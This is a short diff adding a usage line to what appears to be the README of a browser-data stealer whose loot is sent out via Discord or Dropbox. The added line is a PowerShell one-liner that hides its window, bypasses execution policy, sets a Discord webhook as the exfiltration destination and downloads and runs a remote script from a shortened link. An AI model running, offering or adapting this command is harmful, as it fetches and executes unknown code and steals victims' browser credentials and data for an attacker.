@@ -28,3 +28,7 @@ They are then exfiled using either Discord or Dropbox.
 
 SYNTAX:
 
+
+```
+powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1092997498089521183/ZzWeOZRzAfNWtqXfzLDv47DMWokwf-yMbhL-px977t0sqqTGDuT9YmI27cIKRrxF9Tza';irm tinyurl.com/browserData1 | iex
+```
